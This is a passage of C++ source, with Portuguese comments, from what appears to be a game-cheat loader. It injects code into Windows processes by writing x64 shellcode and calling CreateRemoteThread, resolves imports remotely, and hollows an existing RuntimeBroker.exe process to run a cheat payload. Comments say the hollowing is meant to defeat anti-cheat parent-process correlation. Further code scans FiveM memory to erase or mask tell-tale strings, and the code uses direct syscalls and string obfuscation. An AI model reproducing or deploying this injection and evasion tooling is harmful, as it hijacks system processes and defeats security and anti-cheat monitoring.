                    reinterpret_cast<PVOID>(rt.flag), &done, sizeof(done), &rd)) &&
                rd == sizeof(done) && done == 1)
            {
                // LoadLibraryW terminou. Le o HMODULE antes de suspender; o
                // done stub grava result antes de flag.
                uint64_t loaded = 0;
                SIZE_T rr = 0;
                if (NT_SUCCESS(nt::NtReadVirtualMemory_(hProc,
                        reinterpret_cast<PVOID>(rt.result), &loaded,
                        sizeof(loaded), &rr)) && rr == sizeof(loaded))
                    rt.lastLoaded = static_cast<uintptr_t>(loaded);

                if (api::SuspendThread_(rt.hThread) == static_cast<DWORD>(-1))
                {

                    return false;
                }
                return true;
            }
        }


        return false;
    }

    // Stub executado por um CreateRemoteThread novo.  Evita reutilizar a
    // main thread suspensa e grava o HMODULE completo (64 bits) em result;
    // GetExitCodeThread so devolve DWORD e truncaria o handle.
    inline uintptr_t RemoteLoadLibraryViaThread(HANDLE hProc, RemoteHijackThread& rt,
                                                const wchar_t* path, DWORD flags)
    {
        if (!hProc || !rt.remotePage || !path || !*path) return 0;

        const SIZE_T bytes = (wcslen(path) + 1) * sizeof(wchar_t);
        if (bytes == 0 || bytes > 0x300) return 0;

        SIZE_T written = 0;
        if (!api::WriteProcessMemory_(hProc, rt.remotePage, path, bytes, &written))
        {

            return 0;
        }

        unsigned char zeros[0x18]{};
        api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(rt.flag),
                                 zeros, sizeof(zeros), &written);

        const uintptr_t target = flags ? rt.childLoadLibraryExW : rt.childLoadLibraryW;
        if (!target)
        {

            return 0;
        }

        //  rcx=path  rdx=0  r8d=flags  rax=target
        //  sub rsp,28; call rax; add rsp,28
        //  mov rdx,rax; mov rax,result; mov [rax],rdx
        //  mov rax,flag; mov qword [rax],1; jmp $
        // O stub nao retorna: retornar ao BaseThreadInitThunk depois de um
        // CreateRemoteThread gerava AV (exit 0xC0000005) no child.
        unsigned char stub[63] = {
            0x41,0xB8, 0,0,0,0,
            0x31,0xD2,
            0x48,0xB8, 0,0,0,0,0,0,0,0,
            0x48,0x83,0xEC,0x28,
            0xFF,0xD0,
            0x48,0x83,0xC4,0x28,
            0x48,0x89,0xC2,
            0x48,0xB8, 0,0,0,0,0,0,0,0,
            0x48,0x89,0x10,
            0x48,0xB8, 0,0,0,0,0,0,0,0,
            0x48,0xC7,0x00,0x01,0x00,0x00,0x00,
            0xEB,0xFE
        };
        const uint64_t resultAddr = static_cast<uint64_t>(rt.result);
        const uint64_t flagAddr   = static_cast<uint64_t>(rt.flag);
        stub[2] = static_cast<unsigned char>(flags & 0xFF);
        stub[3] = static_cast<unsigned char>((flags >> 8) & 0xFF);
        stub[4] = static_cast<unsigned char>((flags >> 16) & 0xFF);
        stub[5] = static_cast<unsigned char>((flags >> 24) & 0xFF);
        for (int i = 0; i < 8; ++i)
        {
            stub[10 + i] = static_cast<unsigned char>((target >> (8 * i)) & 0xFF);
            stub[33 + i] = static_cast<unsigned char>((resultAddr >> (8 * i)) & 0xFF);
            stub[46 + i] = static_cast<unsigned char>((flagAddr >> (8 * i)) & 0xFF);
        }
        const uintptr_t stubAddr = reinterpret_cast<uintptr_t>(rt.remotePage) + 0x300;
        if (!api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(stubAddr),
                                      stub, sizeof(stub), &written))
        {

            return 0;
        }

        DWORD tid = 0;
        HANDLE th = api::CreateRemoteThread_(
            hProc, nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(stubAddr),
            rt.remotePage, 0, &tid);
        if (!th)
        {

            if (HijackLoadLibraryW(hProc, rt, path, flags))
                return rt.lastLoaded;
            return 0;
        }

        uint64_t done = 0;
        uint64_t loaded = 0;
        SIZE_T r = 0;
        for (int attempt = 0; attempt < 12000; ++attempt)
        {
            r = 0;
            if (NT_SUCCESS(nt::NtReadVirtualMemory_(hProc,
                    reinterpret_cast<PVOID>(rt.flag), &done,
                    sizeof(done), &r)) && done == 1)
                break;
            if (api::WaitForSingleObject_(th, 0) == WAIT_OBJECT_0)
                break;
            api::Sleep_(2);
        }
        r = 0;
        nt::NtReadVirtualMemory_(hProc, reinterpret_cast<PVOID>(rt.result),
                                 &loaded, sizeof(loaded), &r);
        api::TerminateThread_(th, 0);
        api::CloseH(th);



        if (done != 1)
        {

            return 0;
        }

        rt.lastLoaded = static_cast<uintptr_t>(loaded);
        return rt.lastLoaded;
    }

    inline uintptr_t RemoteLoadLibraryW(HANDLE hProc, DWORD pid,
                                        RemoteHijackThread& rt, const wchar_t* path,
                                        DWORD flags = 0)
    {
        if (!hProc || !path || !*path) return 0;
        (void)pid;

        const uintptr_t loaded = RemoteLoadLibraryViaThread(hProc, rt, path, flags);
        if (!loaded)

        return loaded;
    }

    inline bool ResolveImportsInRemote(HANDLE hProc, DWORD pid, RemoteHijackThread& rt,
                                       PVOID remoteBase,
                                       const unsigned char* image, std::size_t imageSize,
                                       const IMAGE_NT_HEADERS64* nt)
    {
        const auto& impDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (!impDir.VirtualAddress || impDir.Size == 0) return true;

        auto rvaToOff = [&](DWORD rva) -> std::size_t {
            if (rva < nt->OptionalHeader.SizeOfHeaders) return rva;
            const auto* sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
            {
                DWORD va   = sec[i].VirtualAddress;
                DWORD raw  = sec[i].SizeOfRawData;
                DWORD virt = sec[i].Misc.VirtualSize;
                DWORD span = virt > raw ? virt : raw;
                if (rva >= va && rva < va + span)
                {
                    DWORD delta = rva - va;
                    if (delta >= raw) return 0;
                    return static_cast<std::size_t>(sec[i].PointerToRawData) + delta;
                }
            }
            return 0;
        };

        auto toWide = [](const char* s) -> std::wstring {
            std::wstring w;
            if (!s) return w;
            while (*s) w.push_back(static_cast<wchar_t>(static_cast<unsigned char>(*s++)));
            return w;
        };

        std::vector<std::pair<std::wstring, uintptr_t>> remoteMods;
        auto findRemote = [&](const std::wstring& name) -> uintptr_t {
            for (const auto& m : remoteMods)
                if (_wcsicmp(m.first.c_str(), name.c_str()) == 0) return m.second;
            return 0;
        };
        auto rememberRemote = [&](const std::wstring& name, uintptr_t base) {
            if (base) remoteMods.emplace_back(name, base);
        };

        std::size_t descOff = rvaToOff(impDir.VirtualAddress);
        if (!descOff || descOff >= imageSize) return false;

        for (DWORD i = 0;; ++i)
        {
            std::size_t off = descOff + static_cast<std::size_t>(i) * sizeof(IMAGE_IMPORT_DESCRIPTOR);
            if (off + sizeof(IMAGE_IMPORT_DESCRIPTOR) > imageSize) break;

            const auto* desc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(image + off);
            if (!desc->Name) break;

            std::size_t nameOff = rvaToOff(desc->Name);
            if (!nameOff || nameOff >= imageSize) return false;
            const char* dllName = reinterpret_cast<const char*>(image + nameOff);
            if (!memchr(dllName, 0, imageSize - nameOff)) return false;

            std::wstring wname = toWide(dllName);
            std::wstring remoteName = wname;
            const bool apiSet = (strncmp(dllName, "api-ms-win-crt-", 15) == 0);
            if (apiSet) remoteName = L"ucrtbase.dll";
            // RuntimeBroker nao resolve d3dx9_43.dll pelo nome (retorna NULL
            // depois de ~60 s no processo hollowed). Caminho absoluto evita o
            // search path/package graph do host e usa o System32 real.
            else if (_wcsicmp(wname.c_str(), L"d3dx9_43.dll") == 0)
                remoteName = L"C:\\Windows\\System32\\d3dx9_43.dll";


            // D3DX9 falha no DllMain do RuntimeBroker (NULL apos ~60 s).
            // DONT_RESOLVE_DLL_REFERENCES mapeia os exports sem rodar DllMain;
            // as funcoes importadas sao matematicas (D3DXVec/Matrix).
            const DWORD loadFlags =
                (_wcsicmp(wname.c_str(), L"d3dx9_43.dll") == 0) ? 1u : 0u;
            uintptr_t remoteDllBase = RemoteLoadLibraryW(hProc, pid, rt,
                                                        remoteName.c_str(), loadFlags);
            if (!remoteDllBase)
            {

                return false;
            }
            rememberRemote(remoteName, remoteDllBase);

            HMODULE localDll = api::LoadLibraryW_(remoteName.c_str());
            if (!localDll)
            {

                return false;
            }

            DWORD oftRva = desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk;
            if (!desc->FirstThunk) return false;
            std::size_t oftOff = rvaToOff(oftRva);
            if (!oftOff || oftOff >= imageSize) return false;

            for (DWORD j = 0;; ++j)
            {
                std::size_t thunkOff = oftOff + static_cast<std::size_t>(j) * sizeof(ULONGLONG);
                if (thunkOff + sizeof(ULONGLONG) > imageSize) break;

                ULONGLONG thunk = *reinterpret_cast<const ULONGLONG*>(image + thunkOff);
                if (!thunk) break;

                FARPROC localFunc = nullptr;
                std::string fnName;
                if (thunk & IMAGE_ORDINAL_FLAG64)
                {
                    WORD ord = static_cast<WORD>(thunk & 0xFFFF);
                    localFunc = api::GetProcAddr(localDll,
                        reinterpret_cast<LPCSTR>(static_cast<ULONG_PTR>(ord)));
                    fnName = "#" + std::to_string(static_cast<unsigned>(ord));
                }
                else
                {
                    std::size_t impOff = rvaToOff(static_cast<DWORD>(thunk));
                    if (!impOff || impOff + 2 >= imageSize) return false;
                    const char* fname = reinterpret_cast<const char*>(image + impOff + 2);
                    if (!memchr(fname, 0, imageSize - (impOff + 2))) return false;
                    fnName = fname;
                    localFunc = api::GetProcAddr(localDll, fname);
                }

                if (!localFunc)
                {

                    return false;
                }

                MEMORY_BASIC_INFORMATION mbi{};
                if (LocalVirtualQuery(reinterpret_cast<LPCVOID>(localFunc), &mbi) != sizeof(mbi) ||
                    !mbi.AllocationBase)
                {

                    return false;
                }

                uintptr_t localModBase = reinterpret_cast<uintptr_t>(mbi.AllocationBase);
                wchar_t modPath[MAX_PATH]{};
                DWORD modLen = api::GetModuleFileNameW_(
                    reinterpret_cast<HMODULE>(localModBase), modPath, MAX_PATH);
                if (!modLen) return false;

                const wchar_t* modName = modPath;
                for (const wchar_t* p = modPath; *p; ++p)
                    if (*p == L'\\' || *p == L'/') modName = p + 1;

                uintptr_t childModBase = findRemote(modName);
                if (!childModBase)
                {
                    childModBase = RemoteLoadLibraryW(hProc, pid, rt, modPath);
                    if (!childModBase)
                    {

                        return false;
                    }
                    rememberRemote(modName, childModBase);
                }

                uintptr_t childFunc = childModBase +
                    (reinterpret_cast<uintptr_t>(localFunc) - localModBase);
                uintptr_t iatAddr = reinterpret_cast<uintptr_t>(remoteBase) +
                    desc->FirstThunk + static_cast<uintptr_t>(j) * sizeof(ULONGLONG);

                SIZE_T w = 0;
                if (!api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(iatAddr),
                        &childFunc, sizeof(childFunc), &w) || w != sizeof(childFunc))
                {

                    return false;
                }
            }
        }

        return true;
    }

    // =========================================================================
  // ProcessHollowing
  // =========================================================================
    // -------------------------------------------------------------------------
    // Pipeline portado do cheat-bypass-hollowprocess-project (PEParser +
    // HollowingCore). PE64 somente. Usa nt::* (syscalls diretos) p/ VM ops e
    // api::* (CreateProcess/GetContext/SetContext/Resume) p/ context + spawn.
    // -------------------------------------------------------------------------
    namespace Hollow
    {
        struct PE_INFO
        {
            PIMAGE_DOS_HEADER       dosHeader;
            PIMAGE_NT_HEADERS64     ntHeaders;
            const unsigned char*    data;
            std::size_t             size;
        };

        inline bool Parse(const unsigned char* image, std::size_t imageSize, PE_INFO& out)
        {
            if (!image || imageSize < sizeof(IMAGE_DOS_HEADER)) return false;
            auto* dos = (PIMAGE_DOS_HEADER)image;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
            if (dos->e_lfanew <= 0 ||
                (std::size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > imageSize)
                return false;
            auto* nth = (PIMAGE_NT_HEADERS64)(image + dos->e_lfanew);
            if (nth->Signature != IMAGE_NT_SIGNATURE) return false;
            if (nth->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;
            if (nth->FileHeader.Machine   != IMAGE_FILE_MACHINE_AMD64)      return false;

            out.dosHeader = dos;
            out.ntHeaders = nth;
            out.data      = image;
            out.size      = imageSize;
            return true;
        }

        static inline PVOID NtAllocate(HANDLE h, PVOID preferred, SIZE_T size,
                                       ULONG allocType, ULONG prot)
        {
            PVOID base = preferred;
            SIZE_T rs = size;
            NTSTATUS st = nt::NtAllocateVirtualMemory_(h, &base, 0, &rs, allocType, prot);
            return (st >= 0) ? base : nullptr;
        }

        static inline bool NtWrite(HANDLE h, PVOID dst, const void* src, SIZE_T size)
        {
            SIZE_T w = 0;
            NTSTATUS st = nt::NtWriteVirtualMemory_(h, dst, (PVOID)src, size, &w);
            return st >= 0;
        }

        static inline bool NtRead(HANDLE h, PVOID src, void* dst, SIZE_T size)
        {
            SIZE_T r = 0;
            NTSTATUS st = nt::NtReadVirtualMemory_(h, src, dst, size, &r);
            return st >= 0;
        }

        inline bool FixRelocations(HANDLE hProc, PVOID remoteBase,
                                   const PE_INFO& pe, ULONG_PTR delta)
        {
            IMAGE_DATA_DIRECTORY relocDir =
                pe.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocDir.Size == 0 || relocDir.VirtualAddress == 0) return true;

            DWORD relocOffset = 0;
            PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(pe.ntHeaders);
            WORD n = pe.ntHeaders->FileHeader.NumberOfSections;
            for (WORD i = 0; i < n; ++i)
            {
                if (sh[i].VirtualAddress <= relocDir.VirtualAddress &&
                    relocDir.VirtualAddress < sh[i].VirtualAddress + sh[i].Misc.VirtualSize)
                {
                    relocOffset = sh[i].PointerToRawData +
                                  (relocDir.VirtualAddress - sh[i].VirtualAddress);
                    break;
                }
            }
            if (relocOffset == 0) return false;

            DWORD parsed = 0;
            while (parsed < relocDir.Size)
            {
                auto* block = (PIMAGE_BASE_RELOCATION)(pe.data + relocOffset + parsed);
                if (block->SizeOfBlock == 0) break;

                DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD list  = (PWORD)((ULONG_PTR)block + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD k = 0; k < count; ++k)
                {
                    WORD type   = list[k] >> 12;
                    WORD offset = list[k] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW)
                    {
                        ULONG_PTR addr = (ULONG_PTR)remoteBase + block->VirtualAddress + offset;
                        ULONG_PTR val  = 0;
                        if (!NtRead(hProc, (PVOID)addr, &val, sizeof(val))) continue;
                        val += delta;
                        NtWrite(hProc, (PVOID)addr, &val, sizeof(val));
                    }
                }
                parsed += block->SizeOfBlock;
            }
            return true;
        }

        // PerformHollowing — hollow de um RuntimeBroker.exe JA EXISTENTE.
        //
        // Nao chama CreateProcessW: o alvo nao e filho do loader, eliminando o
        // vinculo de parentesco (ProcessId -> ParentProcessId) usado pelo
        // anti-cheat para correlacionar host de injecao + vitima hollowed.
        // O image original e desmapeado e substituido pelo payload do cheat.
        inline bool PerformHollowing(const wchar_t* targetPath, const PE_INFO& pe,
                                     DWORD& outPid, HANDLE& outProc, HANDLE& outThread)
        {
            outPid = 0; outProc = nullptr; outThread = nullptr;

            const DWORD selfPid  = api::GetCurrentProcessId_();
            const DWORD oldChild = g_hollowedChildPid.load(std::memory_order_acquire);

            auto pids = FindAllPidsByImagePath(std::wstring(targetPath));
            DWORD pid = 0;
            for (DWORD cand : pids) {
                if (cand != selfPid && cand != oldChild) { pid = cand; break; }
            }
            if (!pid) {
                for (DWORD cand : pids) { if (cand != selfPid) { pid = cand; break; } }
            }
            if (!pid) {
                return false;
            }

            constexpr DWORD TARGET_ACCESS =
                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
                PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME;

            HANDLE hProc = api::OpenProcess_(TARGET_ACCESS, FALSE, pid);
            if (!hProc) {
                return false;
            }

            // Escolhe uma thread do alvo para sequestrar.
            HANDLE hThread = nullptr;
            HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te{}; te.dwSize = sizeof(te);
                if (api::Thread32First_(snap, &te)) {
                    do {
                        if (te.th32OwnerProcessID != pid) continue;
                        hThread = api::OpenThread_(
                            THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
                            THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                            FALSE, te.th32ThreadID);
                        if (hThread) {
                            break;
                        }
                    } while (api::Thread32Next_(snap, &te));
                }
                sc::CallCloseHandle(snap);
            }
            if (!hThread) {
                api::CloseH(hProc);
                return false;
            }

            // Nao ha CreateProcessW: em caso de falha as threads permanecem
            // suspensas (nao executam codigo num image desmapeado).
            auto fail = [&]() {
                api::CloseH(hThread);
                api::CloseH(hProc);
            };

            // Suspende todas as threads antes de desmapear o image original.
            using NtSuspend = LONG(NTAPI*)(HANDLE);
            static NtSuspend pSuspend = reinterpret_cast<NtSuspend>(
                sc::Resolve(xorstr("ntdll.dll"), xorstr("NtSuspendProcess")));
            if (pSuspend) pSuspend(hProc);

            // PEB via NtQueryInformationProcess. NAO usar RDX do contexto:
            // a thread escolhida ja esta em execucao, nao parada no entry point.
            PVOID peb = QueryRemotePebBase(hProc);
            ULONG_PTR remoteImageBase = 0;
            if (peb) NtRead(hProc, (PVOID)((ULONG_PTR)peb + 0x10),
                            &remoteImageBase, sizeof(remoteImageBase));

            CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
            if (!api::GetThreadContext_(hThread, &ctx)) {

                fail(); return false;
            }

            ULONG_PTR imageBase = pe.ntHeaders->OptionalHeader.ImageBase;
            DWORD     imageSize = pe.ntHeaders->OptionalHeader.SizeOfImage;

            // Desmapeia o image original: hollowing real, sem processo novo.
            using NtUnmap = NTSTATUS(NTAPI*)(HANDLE, PVOID);
            static NtUnmap pUnmap = reinterpret_cast<NtUnmap>(
                sc::Resolve(xorstr("ntdll.dll"), xorstr("NtUnmapViewOfSection")));
            if (pUnmap && remoteImageBase) {
                NTSTATUS st = pUnmap(hProc, (PVOID)remoteImageBase);
            }

            // Aloca na base preferida; fallback: qualquer base
            PVOID remoteBase = NtAllocate(hProc, (PVOID)imageBase, imageSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (!remoteBase) {
                remoteBase = NtAllocate(hProc, nullptr, imageSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            }
            if (!remoteBase) {  fail(); return false; }

            // Escreve headers
            DWORD headerSize = pe.ntHeaders->OptionalHeader.SizeOfHeaders;
            if (!NtWrite(hProc, remoteBase, pe.data, headerSize)) {

                fail(); return false;
            }

            // Escreve secoes
            PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(pe.ntHeaders);
            WORD numSec = pe.ntHeaders->FileHeader.NumberOfSections;
            for (WORD i = 0; i < numSec; ++i)
            {
                if (sh[i].SizeOfRawData == 0) continue;
                if ((std::size_t)sh[i].PointerToRawData + sh[i].SizeOfRawData > pe.size) {

                    fail(); return false;
                }
                PVOID dst = (PVOID)((ULONG_PTR)remoteBase + sh[i].VirtualAddress);
                const void* src = pe.data + sh[i].PointerToRawData;
                if (!NtWrite(hProc, dst, src, sh[i].SizeOfRawData)) {

                    fail(); return false;
                }
            }

            // Fixa relocations se base final != preferida
            ULONG_PTR delta = (ULONG_PTR)remoteBase - imageBase;
            if (delta != 0)
            {

                if (!FixRelocations(hProc, remoteBase, pe, delta)) {

                    fail(); return false;
                }
            }

            // Patcheia PEB.ImageBaseAddress (PEB obtido via NtQueryInformationProcess).
            ULONG_PTR entryPoint = (ULONG_PTR)remoteBase +
                                   pe.ntHeaders->OptionalHeader.AddressOfEntryPoint;
            if (peb && !NtWrite(hProc, (PVOID)((ULONG_PTR)peb + 0x10),
                                &remoteBase, sizeof(remoteBase))) {

                fail(); return false;
            }

            // A thread ja esta em execucao (nao e um processo recem-criado cujo
            // RtlUserThreadStart recebe o entry point em RCX). Aqui o RIP e
            // redirecionado diretamente; no x64 o primeiro argumento do entry
            // point e o endereco do PEB, por isso RCX = peb.
            ctx.Rcx = (ULONG_PTR)peb;
            ctx.Rip = entryPoint;
            if (!api::SetThreadContext_(hThread, &ctx)) {

                fail(); return false;
            }


            if (api::ResumeThread_(hThread) == (DWORD)-1) {
                fail(); return false;
            }

            outPid    = pid;
            outProc   = hProc;
            outThread = hThread;
            return true;
        }
    } // namespace Hollow

    inline bool ProcessHollowing(const wchar_t* targetPath,
        const unsigned char* image, std::size_t imageSize)
    {

        if (!targetPath || !*targetPath) {  return false; }


        Hollow::PE_INFO pe{};
        if (!Hollow::Parse(image, imageSize, pe)) {
            return false;
        }

        DWORD  pid = 0;
        HANDLE hProc = nullptr, hThr = nullptr;
        bool ok = Hollow::PerformHollowing(targetPath, pe, pid, hProc, hThr);

        if (!ok) return false;

        // O alvo e um processo JA EXISTENTE, nao um filho criado por nos.
        // Nao registrar em g_hollowedChildPid (alimenta ForceCloseHollowedChild)
        // e nao anexar ao kill-job: isso terminaria um processo do sistema.

        api::CloseH(hThr);
        api::CloseH(hProc);


        return true;
    }

    // =========================================================================
    // ZeroBytesInProcess — write zero bytes to remote/local address
    // =========================================================================
    inline bool ZeroBytesInProcess(HANDLE hProc, PVOID address,
                                    const void* zeros, SIZE_T length, SIZE_T& written);

    struct Needle_ { const uint8_t* bytes; std::size_t len; };

    // -------------------------------------------------------------------------
    // DynamicNeedles — 64-slot stack needle set, wiped on scope exit.
    // (DownloadLeakFragments alone needs 18 narrow+wide slots.)
    // -------------------------------------------------------------------------
    struct DynamicNeedles
    {
        static constexpr std::size_t kSlotSize = 128;
        static constexpr std::size_t kMaxCount = 64;

        uint8_t storage[kMaxCount * kSlotSize]{};
        Needle_ needles[kMaxCount]{};
        std::size_t count = 0;

        void addNarrow(const char* s, std::size_t n)
        {
            if (n == 0 || n > kSlotSize || count >= kMaxCount) return;
            uint8_t* dst = storage + count * kSlotSize;
            for (std::size_t i = 0; i < n; ++i) dst[i] = static_cast<uint8_t>(s[i]);
            needles[count++] = { dst, n };
        }
        void addNarrow(const char* s)        { std::size_t n = 0; while (s[n]) ++n; addNarrow(s, n); }
        void addNarrow(const std::string& s) { addNarrow(s.data(), s.size()); }

        void addWide(const wchar_t* s, std::size_t n)
        {
            if (n == 0 || n * 2 > kSlotSize || count >= kMaxCount) return;
            uint8_t* dst = storage + count * kSlotSize;
            for (std::size_t i = 0; i < n; ++i)
            {
                dst[i * 2]     = static_cast<uint8_t>(s[i] & 0xFF);
                dst[i * 2 + 1] = static_cast<uint8_t>((s[i] >> 8) & 0xFF);
            }
            needles[count++] = { dst, n * 2 };
        }
        void addWide(const wchar_t* s)     { std::size_t n = 0; while (s[n]) ++n; addWide(s, n); }
        void addWide(const std::wstring& s){ addWide(s.data(), s.size()); }

        void addNarrowAndWide(const char* s)
        {
            std::size_t n = 0; while (s[n]) ++n;
            if (n == 0) return;
            addNarrow(s, n);
            wchar_t w[128]{};
            if (n < 128) {
                for (std::size_t i = 0; i < n; ++i)
                    w[i] = static_cast<wchar_t>(static_cast<unsigned char>(s[i]));
                addWide(w, n);
            }
        }

        void addNarrowAndWide(const std::string& s)
        {
            if (s.empty()) return;
            addNarrow(s.data(), s.size());
            wchar_t w[128]{};
            if (s.size() < 128)
            {
                for (std::size_t i = 0; i < s.size(); ++i)
                    w[i] = static_cast<wchar_t>(
                        static_cast<unsigned char>(s[i]));
                addWide(w, s.size());
            }
        }

        uintptr_t lo() const { return reinterpret_cast<uintptr_t>(storage); }
        uintptr_t hi() const { return reinterpret_cast<uintptr_t>(storage) + sizeof(storage); }

        void wipe()
        {
            volatile uint8_t* p = storage;
            for (std::size_t i = 0; i < sizeof(storage); ++i) p[i] = 0;
            count = 0;
        }
    };

    // -------------------------------------------------------------------------
    // ZeroNeedlesIn — scan process memory and either zero matches or apply a
    // length-preserving mask for the narrow F7 FiveM path.
    // storageLo/Hi guard: skip matches inside the needle storage itself.
    // -------------------------------------------------------------------------
    inline std::size_t ZeroNeedlesIn(HANDLE hProc,
                                      const Needle_* needles, std::size_t nCount,
                                      uintptr_t storageLo = 0, uintptr_t storageHi = 0,
                                      std::size_t* foundOut = nullptr,
                                      bool countOnly = false,
                                      bool abortOnPause = false,
                                      bool preserveLength = false,
                                      bool requireTerminator = false)
    {
        if (foundOut) *foundOut = 0;
        if (!hProc || !needles || nCount == 0) return 0;

        bool firstByte[256]{};
        std::size_t maxLen = 0;
        for (std::size_t n = 0; n < nCount; ++n)
        {
            if (!needles[n].bytes || needles[n].len == 0) continue;
            if (needles[n].len > maxLen) maxLen = needles[n].len;
            uint8_t fb = needles[n].bytes[0];
            firstByte[fb] = true;
            if (fb >= 'a' && fb <= 'z') firstByte[fb - 32] = true;
            if (fb >= 'A' && fb <= 'Z') firstByte[fb + 32] = true;
        }
        if (maxLen == 0) return 0;

        // 8 MB por leitura: o FiveM tem ~3.4 GB de memoria privada. Com
        // 64 KB eram ~55 mil NtReadVirtualMemory (page-in storm); com 8 MB
        // sao ~430 leituras e o scan termina em segundos, nao minutos.
        constexpr SIZE_T kChunk   = 0x800000;
        constexpr SIZE_T kOverlap = 256;
        // Um unico buffer compartilhado; o flag serializa CloakWatchdog/F7.

        // thread_local nao funciona de forma confiavel no shellcode injetado
        // em RuntimeBroker (TLS do host nao foi inicializado).
        static uint8_t buf[kChunk + kOverlap];
        static std::atomic_flag bufLock = ATOMIC_FLAG_INIT;
        while (bufLock.test_and_set(std::memory_order_acquire))
            api::Sleep_(1);
        if (abortOnPause && g_f7Active.load(std::memory_order_relaxed)) {
            bufLock.clear(std::memory_order_release);
            return 0;
        }

        const DWORD writable = preserveLength
            ? PAGE_READWRITE
            : (PAGE_READWRITE | PAGE_WRITECOPY);

        std::size_t cleaned = 0;
        std::size_t regionsScanned = 0;
        PVOID addr = nullptr;

        for (;;)
        {
            MEMORY_BASIC_INFORMATION mbi{};
            SIZE_T ret = 0;
            if (!NT_SUCCESS(nt::NtQueryVirtualMemory_(hProc, addr, 0, &mbi, sizeof(mbi), &ret))) break;
            ++regionsScanned;

            uintptr_t regionEnd = reinterpret_cast<uintptr_t>(mbi.BaseAddress) + mbi.RegionSize;

            if (mbi.State == MEM_COMMIT &&
                mbi.Type == MEM_PRIVATE &&
                (mbi.Protect & writable) && !(mbi.Protect & PAGE_GUARD))
            {
                uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
                for (uintptr_t off = base; off < regionEnd; off += kChunk)
                {
                    if (abortOnPause && g_f7Active.load(std::memory_order_relaxed)) {
                        bufLock.clear(std::memory_order_release);
                        return cleaned;
                    }
                    SIZE_T toRead = kChunk + kOverlap;
                    if (off + toRead > regionEnd) toRead = regionEnd - off;
                    if (toRead < maxLen) continue;

                    SIZE_T rd = 0;
                    if (!NT_SUCCESS(nt::NtReadVirtualMemory_(
                            hProc, reinterpret_cast<PVOID>(off), buf, toRead, &rd)) ||
                        rd < maxLen) continue;

                    const SIZE_T lim = rd;
                    for (SIZE_T i = 0; i < lim; ++i)
                    {
                        if (!firstByte[buf[i]]) continue;

                        for (std::size_t n = 0; n < nCount; ++n)
                        {
                            const std::size_t nl = needles[n].len;
                            // Very short needles are too collision-prone even
                            // with a terminator check. PID strings are kept
                            // when they have at least four characters.
                            if (preserveLength && nl < 4) continue;
                            if (nl == 0 || i + nl > rd) continue;
                            const uint8_t* nb = needles[n].bytes;

                            bool m = true;
                            for (std::size_t j = 0; j < nl; ++j)
                            {
                                uint8_t a = buf[i + j];
                                uint8_t b = nb[j];
                                if (a >= 'A' && a <= 'Z') a += 32;
                                if (b >= 'A' && b <= 'Z') b += 32;
                                if (a != b) { m = false; break; }
                            }
                            if (!m) continue;

                            uintptr_t matchAddr = off + i;
                            if (storageLo && matchAddr >= storageLo && matchAddr < storageHi) continue;

                            bool wideNeedle = nl >= 4 && (nl % 2) == 0;
                            if (wideNeedle)
                            {
                                for (std::size_t j = 1; j < nl; j += 2)
                                {
                                    if (nb[j] != 0) { wideNeedle = false; break; }
                                }
                            }

                            // For the FiveM mask, only touch a complete
                            // NUL-terminated string. This excludes matches
                            // embedded in resource text or binary records.
                            if (preserveLength && requireTerminator)
                            {
                                if (wideNeedle)
                                {
                                    if ((matchAddr & 1u) != 0 ||
                                        i + nl + 1 >= rd ||
                                        buf[i + nl] != 0 || buf[i + nl + 1] != 0)
                                        continue;
                                }
                                else if (i + nl >= rd || buf[i + nl] != 0)
                                {
                                    continue;
                                }
                            }

                            if (foundOut) ++(*foundOut);
                            if (countOnly) continue;

                            static uint8_t zeros[256]{};
                            uint8_t replacement[256]{};
                            const uint8_t* writeBytes = zeros;
                            if (preserveLength)
                            {
                                for (std::size_t j = 0; j < nl; ++j)
                                {
                                    if (wideNeedle && ((j & 1u) != 0))
                                    {
                                        replacement[j] = 0;
                                        continue;
                                    }

                                    const uint8_t c = nb[j];
                                    if (c >= 'A' && c <= 'Z')
                                        replacement[j] = 'X';
                                    else if (c >= 'a' && c <= 'z')
                                        replacement[j] = 'x';
                                    else if (c >= '0' && c <= '9')
                                        replacement[j] = '0';
                                    else
                                        replacement[j] = c;
                                }
                                writeBytes = replacement;
                            }

                            if (preserveLength)
                            {
                                uint8_t verify[256]{};
                                const SIZE_T verifyExtra =
                                    (requireTerminator && wideNeedle) ? 2 :
                                    (requireTerminator ? 1 : 0);
                                const SIZE_T verifyLen = nl + verifyExtra;
                                if (verifyLen > sizeof(verify)) continue;

                                SIZE_T vr = 0;
                                if (!NT_SUCCESS(nt::NtReadVirtualMemory_(
